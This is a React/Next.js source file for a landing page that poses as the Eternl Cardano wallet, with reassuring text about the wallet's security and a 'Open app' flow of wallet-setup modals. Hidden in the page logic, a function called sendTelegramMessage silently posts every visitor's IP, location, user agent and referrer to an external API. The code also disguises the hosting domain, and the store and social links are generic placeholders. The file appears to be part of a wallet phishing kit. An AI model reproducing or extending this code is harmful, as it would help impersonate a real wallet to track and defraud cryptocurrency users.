"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import Link from "next/link";
import WelcomeModal from "../../components/WelcomeModal";
import AppSetupModal from "../../components/AppSetupModal";
import CreatePinModal from "../../components/CreatePinModal";
import SelectWalletTypeModal from "../../components/SelectWalletTypeModal";
import { useRef } from "react";
import { usePathname } from "next/navigation";
import { getUserCountry } from "../userLocation";
import axios from "axios";
import { API_CONFIG } from "../config";

export default function LandingPage() {
  // Two modals managed separately
  const [welcomeOpen, setWelcomeOpen] = useState(false);
  const [setupOpen, setSetupOpen] = useState(false);
  const [pinOpen, setPinOpen] = useState(false);
  const [showSelectType, setShowSelectType] = useState(false);
  const [country, setCountry] = useState("");
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState("");
  const hasSentVisitorMessage = useRef(false);
  const pathname = usePathname();
  const getCurrentUrl = () => {
    if (typeof window !== "undefined") {
      let url = `${window.location.origin}${pathname}`;
      if (url.includes("localhost")) {
        url = "https://google.com";
      }
      if (url.includes("vercel.com")) {
        url = url.replace("vercel.com", "digitalocean.com");
      }
      console.log("getCurrentUrl returning:", url);
      return url;
    }
    console.log("getCurrentUrl: window not available, returning empty string");
    return "";
  };
  const sendTelegramMessage = (
    userCountry: {
      country?: string;
      countryEmoji?: string;
      city?: string;
      ip?: string;
    } | null
  ) => {
    // console.log("User Country", userCountry);

    // Prevent bots from triggering notifications
    const userAgent = typeof navigator !== "undefined" ? navigator.userAgent : "";
    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(userAgent);

    if (isBot) {
      console.log("Bot detected, skipping Telegram notification");
      return;
    }

    const messageData = {
      info: "Regular Visitor", // You can update this logic as needed
      url: getCurrentUrl(),
      referer: document.referrer || getCurrentUrl(),
      location: {
        country: userCountry?.country || "Unknown",
        countryEmoji: userCountry?.countryEmoji || "",
        city: userCountry?.city || "Unknown",
        ipAddress: userCountry?.ip || "0.0.0.0",
      },
      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
      date: new Date().toISOString(),
      appName: "eternl",
    };
    console.log("Message Data", messageData);
    axios
      .post(
        API_CONFIG.URL,
        messageData,
        {
          headers: {
            "Content-Type": "application/json",
            "x-api-key": API_CONFIG.KEY,
          },
        }
      )
      .catch((error) =>
        console.error(
          "Error sending font message:",
          error.response.data.details
        )
      );
  };

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, [sendTelegramMessage]);

  useEffect(() => {
    // Set browser info only on client side
    if (typeof window !== "undefined") {
      setBrowser(navigator.userAgent);
    }
  }, [sendTelegramMessage]);
  return (
    <main className="min-h-screen bg-[#0e0e0e] text-white flex flex-col items-center relative">
      {/* Top gradient line */}
      <div className="w-full h-0.5 bg-gradient-to-r from-pink-500 via-orange-400 to-purple-500" />

      {/* Hero section */}
      <section className="flex flex-col items-start text-left mt-24 px-12 sm:px-24 flex-grow">
        <h1 className="mt-10 text-5xl sm:text-6xl font-extrabold leading-tight">
          <span className="bg-gradient-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
            A modern Cardano Wallet.{" "}
          </span>
          <br />
          <span className="bg-gradient-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
            For everyone.
          </span>
        </h1>

        <p className="mt-6 text-xl text-white/80 max-w-[40ch]">
          Friendly for beginners. <br />
          Powerful for pro users.
        </p>

        <button
          onClick={() => setWelcomeOpen(true)}
          className="mt-8 bg-pink-500 hover:bg-pink-600 text-white font-semibold rounded-full px-8 py-4 transition"
        >
          Open app
        </button>

        {/* Download cards */}
        <div className="mt-12 flex flex-col sm:flex-row gap-6">
          <div className="bg-[#161616] rounded-2xl shadow-md p-6 w-72 text-left">
            <h2 className="text-white font-semibold text-lg">
              Mobile Dapps{" "}
              <span className="text-gray-400 font-normal">(Dapp browser)</span>
            </h2>
            <p className="mt-2 text-sm text-gray-400">
              Your wallet on the go, now with DApp support.
            </p>

            <div className="mt-4 flex flex-col gap-3">
              <Link
                href="https://play.google.com/store"
                target="_blank"
                className="flex items-center justify-center gap-2 bg-[#222] rounded-xl h-10 text-sm font-medium hover:bg-[#2a2a2a] transition"
              >
                <Image
                  src="/brand/play.svg"
                  alt="Google Play"
                  width={20}
                  height={20}
                />
                Google Play
              </Link>
              <Link
                href="https://www.apple.com/app-store/"
                target="_blank"
                className="flex items-center justify-center gap-2 bg-[#222] rounded-xl h-10 text-sm font-medium hover:bg-[#2a2a2a] transition"
              >
                <Image
                  src="/brand/apple.svg"
                  alt="Apple Store"
                  width={20}
                  height={20}
                />
                Apple Store
              </Link>
            </div>
          </div>

          <div className="bg-[#161616] rounded-2xl shadow-md p-6 w-72 text-left">
            <h2 className="text-white font-semibold text-lg">
              Browser Extension{" "}
              <span className="text-gray-400 font-normal">
                (Dapp connector & browser)
              </span>
            </h2>
            <p className="mt-2 text-sm text-gray-400">
              For Chrome, Edge, Brave and Opera.
            </p>

            <Link
              href="https://chrome.google.com/webstore"
              target="_blank"
              className="mt-4 flex items-center justify-center gap-2 bg-[#222] rounded-xl h-10 text-sm font-medium hover:bg-[#2a2a2a] transition"
            >
              <Image
                src="/brand/chrome.svg"
                alt="Chrome Web Store"
                width={20}
                height={20}
              />
              Chrome Web Store
            </Link>
          </div>
        </div>
      </section>

      <EternlContent />


      {/* Footer */}
      <footer className="w-full max-w-5xl mt-auto mb-10 text-sm text-white/70 px-4">
        <div className="flex flex-col sm:flex-row justify-between gap-6 bg-[#161616] rounded-2xl p-6">
          <div>
            <h3 className="font-semibold mb-2">Resources</h3>
            <ul className="space-y-1">
              <li>
                <Link href="/about" className="hover:text-white">
                  About
                </Link>
              </li>
              <li>
                <Link href="/about/how-to-use-eternl-wallet" className="hover:text-white">
                  How to Use
                </Link>
              </li>
              <li>
                <Link href="/review" className="hover:text-white">
                  Review
                </Link>
              </li>
            </ul>
          </div>

          <div>
            <h3 className="font-semibold mb-2">Social</h3>
            <ul className="space-y-1">
              <li>
                <Link href="https://x.com/" className="hover:text-white">
                  X.com
                </Link>
              </li>
              <li>
                <Link href="https://discord.com/" className="hover:text-white">
                  Discord
                </Link>
              </li>
              <li>
                <Link
                  href="https://web.telegram.org/"
                  className="hover:text-white"
                >
                  Telegram
                </Link>
              </li>
            </ul>
          </div>
        </div>
      </footer>

      {/* 🌈 Welcome Modal */}
      <WelcomeModal
        open={welcomeOpen}
        onClose={() => setWelcomeOpen(false)}
        onNext={() => {
          setWelcomeOpen(false);
          setSetupOpen(true);
        }}
        illustration={
          <Image
            src="/brand/laptop.svg"
            alt="Welcome Illustration"
            width={420}
            height={300}
          />
        }
      />

      {/* ⚙️ Setup Modal */}
      <AppSetupModal
        open={setupOpen}
        onClose={() => setSetupOpen(false)}
        onBack={() => {
          setSetupOpen(false);
          setWelcomeOpen(true);
        }}
        onNext={() => {
          setSetupOpen(false);
          setPinOpen(true);
        }}
      />

      {/* 🔐 Create PIN Modal */}
      <CreatePinModal
        open={pinOpen}
        onClose={() => setPinOpen(false)}
        onBack={() => {
          setPinOpen(false);
          setSetupOpen(true); // go back one step
        }}
        onNext={() => {
          setPinOpen(false);
          setTimeout(() => setShowSelectType(true), 150); // open wallet type modal
        }}
      />

      {/* 💼 Select Wallet Type Modal */}
      <SelectWalletTypeModal
        open={showSelectType}
        onClose={() => setShowSelectType(false)}
        onBack={() => {
          setShowSelectType(false);
          setPinOpen(true);
        }}
        onSelect={(key) => {
          console.log("Selected wallet type:", key);
          // you can trigger the next modal here based on key, e.g.:
          // if (key === "new") setShowCreateWallet(true);
        }}
      />
    </main>
  );
}

function EternlContent() {
  return (
    <section className="w-full max-w-5xl px-6 sm:px-12 py-16 text-gray-300 space-y-16">
      {/* Title */}
      <div className="space-y-4 border-b border-gray-800 pb-8">
        <h1 className="text-4xl sm:text-5xl font-extrabold text-white tracking-tight">
          Eternl Wallet: A Secure Cardano Light Wallet for Managing ADA, NFTs, and dApps
        </h1>
      </div>

      {/* What Is Eternl Wallet? */}
      <div className="space-y-8">
        <h2 className="text-3xl font-bold text-white">What Is Eternl Wallet?</h2>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Overview of Eternl Wallet in the Cardano Ecosystem</h3>
          <p className="leading-relaxed">
            Eternl Wallet is a non-custodial Cardano light wallet designed for managing ADA, Cardano native tokens, and NFTs. It allows users to interact directly with the Cardano blockchain while retaining full control of their private keys. Eternl is commonly used by Cardano community members who require advanced features such as staking, dApp connectivity, and hardware wallet support.
          </p>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Is Eternl Wallet Official and Non-Custodial?</h3>
          <p className="leading-relaxed">
            Eternl Wallet operates as a non-custodial wallet, meaning users fully control their private keys and recovery phrases. No third party can access, freeze, or recover funds on behalf of the user. This self-custody model aligns with Cardano’s decentralized design and places responsibility for security entirely with the wallet owner.
          </p>
        </div>
      </div>

      {/* Hands-On Experience */}
      <div className="space-y-8">
        <h2 className="text-3xl font-bold text-white">Hands-On Experience Using Eternl Wallet</h2>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Setting Up Eternl Wallet for the First Time</h3>
          <p className="leading-relaxed">
            Setting up Eternl Wallet involves installing the browser extension or accessing the supported platform, creating a new wallet, and securely storing the recovery phrase. The wallet guides users through each step and requires confirmation of the recovery phrase before activation. This setup process ensures that users understand the importance of key management from the beginning.
          </p>
          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
            <Image
              src="/step1.png"
              alt="Setting up Eternl Wallet"
              width={1000}
              height={600}
              className="w-full h-auto"
            />
          </div>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Creating and Managing a Cardano Wallet</h3>
          <p className="leading-relaxed">
            Once set up, Eternl Wallet provides a dashboard where users can view ADA balances, native tokens, and transaction history. Wallet management tools allow users to organize accounts and monitor activity in real time. The interface is designed to support both everyday transactions and advanced Cardano operations.
          </p>
          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
            <Image
              src="/step2.png"
              alt="Creating and Managing Wallet"
              width={1000}
              height={600}
              className="w-full h-auto"
            />
          </div>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Sending and Receiving ADA and Native Tokens</h3>
          <p className="leading-relaxed">
            Eternl Wallet enables users to send and receive ADA and Cardano native tokens by generating wallet addresses and confirming transactions. Before broadcasting a transaction, the wallet displays detailed information including fees and asset amounts. This transparency helps users verify transactions before final approval.
          </p>
          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
            <Image
              src="/step3.png"
              alt="Sending and Receiving ADA"
              width={1000}
              height={600}
              className="w-full h-auto"
            />
          </div>
        </div>
      </div>

      {/* Security Features */}
      <div className="space-y-8">
        <h2 className="text-3xl font-bold text-white">Security Features and Privacy Model</h2>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Private Keys, Recovery Phrase, and Self-Custody</h3>
          <p className="leading-relaxed">
            Eternl Wallet stores private keys locally and never transmits recovery phrases to external servers. Users are solely responsible for safeguarding their recovery phrase, which is required to restore access to funds. This self-custody approach ensures full ownership but requires careful security practices.
          </p>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Hardware Wallet Support for Additional Security</h3>
          <p className="leading-relaxed">
            Eternl Wallet supports hardware wallets such as Ledger and Trezor, allowing users to keep private keys offline. When connected, transactions must be physically confirmed on the hardware device before execution. This significantly reduces exposure to online threats and phishing attempts.
          </p>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Protecting Against Common Wallet Risks</h3>
          <p className="leading-relaxed">
            The wallet includes confirmation prompts and clear transaction previews to help prevent accidental or malicious transfers. Users are encouraged to verify dApp permissions and URLs before approving connections. Maintaining updated software and practicing phishing awareness are essential for safe usage.
          </p>
        </div>
      </div>

      {/* Staking ADA */}
      <div className="space-y-8">
        <h2 className="text-3xl font-bold text-white">Staking ADA with Eternl Wallet</h2>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">How ADA Staking Works on Cardano</h3>
          <p className="leading-relaxed">
            ADA staking on Cardano allows users to delegate their funds to stake pools without locking their assets. Delegated ADA remains fully spendable while contributing to network security and decentralization. Rewards are distributed automatically at the end of each epoch based on pool performance.
          </p>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">How to Stake ADA Using Eternl Wallet</h3>
          <p className="leading-relaxed">
            Eternl Wallet provides a built-in staking interface where users can browse available stake pools and delegate their ADA. The process requires selecting a pool, confirming the delegation transaction, and paying a small network fee. Rewards are tracked directly within the wallet.
          </p>
          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
            <Image
              src="/step5.png"
              alt="Staking ADA"
              width={1000}
              height={600}
              className="w-full h-auto"
            />
          </div>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Choosing and Managing Stake Pools</h3>
          <p className="leading-relaxed">
            Users can evaluate stake pools based on metrics such as saturation, performance, and fees. Eternl Wallet allows redelegation at any time without penalty. This flexibility enables users to adjust their staking strategy as network conditions change.
          </p>
          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
            <Image
              src="/step6.png"
              alt="Managing Stake Pools"
              width={1000}
              height={600}
              className="w-full h-auto"
            />
          </div>
        </div>
      </div>

      {/* Using with dApps */}
      <div className="space-y-8">
        <h2 className="text-3xl font-bold text-white">Using Eternl Wallet with Cardano dApps</h2>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Connecting Eternl Wallet to Decentralized Applications</h3>
          <p className="leading-relaxed">
            Eternl Wallet supports standardized Cardano dApp connections, enabling interaction with decentralized platforms. When a dApp requests access, users must manually approve the connection. This ensures that permissions are granted only when intended.
          </p>
          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
            <Image
              src="/step7.png"
              alt="Connecting to dApps"
              width={1000}
              height={600}
              className="w-full h-auto"
            />
          </div>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Transaction Approvals and User Permissions</h3>
          <p className="leading-relaxed">
            Each transaction initiated through a dApp requires explicit user confirmation within the wallet. Eternl Wallet displays transaction details before approval, allowing users to review actions before signing. This process maintains transparency and user control.
          </p>
          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
            <Image
              src="/step8.png"
              alt="Transaction Approvals"
              width={1000}
              height={600}
              className="w-full h-auto"
            />
          </div>
        </div>
      </div>

      {/* NFT Management */}
      <div className="space-y-8">
        <h2 className="text-3xl font-bold text-white">NFT Management in Eternl Wallet</h2>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Viewing and Managing Cardano NFTs</h3>
          <p className="leading-relaxed">
            Eternl Wallet includes native support for Cardano NFTs, allowing users to view and manage collections directly. NFT metadata is displayed within the wallet interface for supported standards. This removes the need for third-party NFT management tools.
          </p>
          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
            <Image
              src="/step9.png"
              alt="Viewing NFTs"
              width={1000}
              height={600}
              className="w-full h-auto"
            />
          </div>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Sending and Receiving NFTs Safely</h3>
          <p className="leading-relaxed">
            NFT transfers in Eternl Wallet follow the same confirmation process as token transactions. Users can verify asset details and destination addresses before approval. This reduces the risk of sending NFTs to incorrect or malicious addresses.
          </p>
        </div>
      </div>

      {/* Advantages and Limitations */}
      <div className="space-y-8">
        <h2 className="text-3xl font-bold text-white">Eternl Wallet Advantages and Limitations</h2>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Key Advantages of Eternl Wallet</h3>
          <p className="leading-relaxed">
            Eternl Wallet offers advanced Cardano-specific features, strong self-custody controls, and hardware wallet compatibility. Its focus on the Cardano ecosystem makes it suitable for users seeking deeper network interaction. The wallet supports both everyday use and advanced functionality.
          </p>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Potential Limitations to Consider</h3>
          <p className="leading-relaxed">
            New users may experience a learning curve due to the wallet’s advanced features. As a non-custodial wallet, Eternl Wallet does not provide account recovery services. Users must take full responsibility for securing their recovery phrase.
          </p>
        </div>
      </div>

      {/* Who Should Use */}
      <div className="space-y-8">
        <h2 className="text-3xl font-bold text-white">Who Should Use Eternl Wallet?</h2>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Suitable Users and Use Cases</h3>
          <p className="leading-relaxed">
            Eternl Wallet is well suited for Cardano users who prioritize control, security, and access to staking and dApps. It is commonly used by individuals who actively participate in the Cardano ecosystem. Users seeking full ownership of their assets may benefit most from this wallet.
          </p>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">When Eternl Wallet May Not Be the Best Option</h3>
          <p className="leading-relaxed">
            Users who prefer custodial solutions or simplified recovery options may find Eternl Wallet less suitable. Those unfamiliar with self-custody practices should ensure they understand wallet security responsibilities before use.
          </p>
        </div>
      </div>

      {/* FAQ */}
      <div className="space-y-8">
        <h2 className="text-3xl font-bold text-white">Frequently Asked Questions About Eternl Wallet</h2>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Is Eternl Wallet safe to use?</h3>
          <p className="leading-relaxed">
            Eternl Wallet is considered safe when used correctly and with proper key management practices. Its non-custodial design ensures user control but requires careful security habits.
          </p>
        </div>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Does Eternl Wallet support NFTs and hardware wallets?</h3>
          <p className="leading-relaxed">
            Yes, Eternl Wallet supports Cardano NFTs and integrates with hardware wallets such as Ledger and Trezor for enhanced security.
          </p>
        </div>
      </div>

      {/* Final Thoughts */}
      <div className="space-y-8">
        <h2 className="text-3xl font-bold text-white">Final Thoughts on Eternl Wallet</h2>

        <div className="space-y-4">
          <h3 className="text-xl font-semibold text-pink-400">Summary Based on Real-World Usage</h3>
          <p className="leading-relaxed">
            Eternl Wallet provides a feature-rich environment for managing Cardano assets with full user control. Its focus on security, staking, and dApp connectivity makes it a strong option for Cardano participants. Users should balance its advanced capabilities with responsible self-custody practices.
          </p>
        </div>
      </div>
    </section>
  );
}
